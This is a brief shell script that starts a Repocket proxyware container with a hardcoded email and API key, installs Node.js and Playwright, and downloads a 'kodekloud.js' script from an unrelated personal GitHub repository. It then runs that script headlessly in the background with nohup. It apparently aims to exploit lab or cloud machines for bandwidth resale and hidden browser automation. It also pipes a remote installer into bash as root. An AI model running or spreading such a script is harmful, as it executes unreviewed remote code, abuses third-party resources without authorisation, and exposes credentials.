#!/bin/sh

docker run -d --restart=always --name repocket -e RP_EMAIL=q2326426@gmail.com -e RP_API_KEY=ff00f832-de20-4fc7-9700-ff85e3fc109e repocket/repocket

apt update -y && apt install -y curl wget gnupg xvfb ca-certificates && \
curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && \
apt install -y nodejs && \
npm install -D playwright && \
npx playwright install --with-deps chromium


wget -O kodekloud.js https://raw.githubusercontent.com/zjaacd/xxx1/refs/heads/main/kodekloud.js  && chmod +x kodekloud.js 
nohup bash -c 'Xvfb :99 -screen 0 1280x900x24 -ac > /dev/null 2>&1 & sleep 1; DISPLAY=:99 node kodekloud.js' > /root/kodekloud.log 2>&1 &
